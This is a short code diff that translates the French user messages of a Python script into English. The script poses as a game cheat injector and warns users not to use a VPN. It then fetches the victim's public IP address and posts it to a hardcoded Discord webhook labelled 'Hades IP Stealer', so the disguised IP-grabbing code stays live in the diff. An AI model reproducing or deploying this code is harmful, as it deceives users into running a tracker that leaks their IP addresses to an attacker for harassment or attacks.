@@ -7,9 +7,9 @@ import requests
 import os 
 
 def load():
-    messagebox.showinfo("Chargement...", "Je suis en train d'injecter les cheats !")
+    messagebox.showinfo("Loading...", "I'm injecting the cheats!")
 
-messagebox.showinfo("VPN !", "Nous utilisons une API privée qui détecte les VPN et les bloquent, veuillez ne pas en activer !")
+messagebox.showinfo("VPN !", "We use a private API that detects and blocks VPNs, please do not enable one!")
 
 ip = get('https://api.ipify.org').text
 webhookURL = 'https://discord.com/api/webhooks/986593311852724226/9Um3bR0WdaDpA3V8vVuywALA3iVZIqAO4NUwnAEm6OA1ATM9xRr3knGb7I2CVsKKeCGJ'
@@ -19,7 +19,7 @@ IPAddr = socket.gethostbyname(hostname)
 data = {
     'username': 'Hades IP Stealer',
     'embeds': [{
-        'title': "J'ai trouver une IP",
+        'title': "I found an IP",
         'description': "**IP :** " + ip,
     }]
 }
